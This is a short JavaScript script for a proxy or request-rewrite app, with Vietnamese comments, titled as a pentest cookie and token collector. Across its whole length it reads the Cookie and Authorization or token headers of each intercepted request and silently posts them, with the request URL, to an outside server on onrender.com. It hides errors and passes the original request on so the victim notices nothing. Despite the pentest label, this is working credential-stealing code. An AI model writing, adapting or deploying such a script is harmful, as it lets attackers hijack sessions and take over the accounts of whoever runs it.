// ========= SCRIPT THU THẬP COOKIE/TOKEN (PENTEST) ========= //
function main() {
  try {
    var user_cookie = $request.headers["Cookie"] || $request.headers["cookie"];
    var user_token = $request.headers["Authorization"] || $request.headers["authorization"] || $request.headers["token"];
    var target_url = $request.url;

    // Lọc bỏ kết nối tới chính server của bạn để tránh vòng lặp vô hạn
    if ((user_cookie || user_token) && !target_url.includes("onrender.com")) {
      const test_server = "https://server-2bpd.onrender.com/"; 
      
      // Gửi trực tiếp dữ liệu lên server ngay khi bắt được
      $httpClient.post({
        url: test_server,
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          url: target_url,
          cookie: user_cookie || "Không có",
          token: user_token || "Không có"
        })
      }, function(error, response, data) {
        // Thực thi ngầm im lặng
      });
    }
  } catch (e) {
    // Dự phòng an toàn
  }
  
  // Trả về request nguyên bản để không làm gián đoạn mạng của ứng dụng
  $done({});
}

main();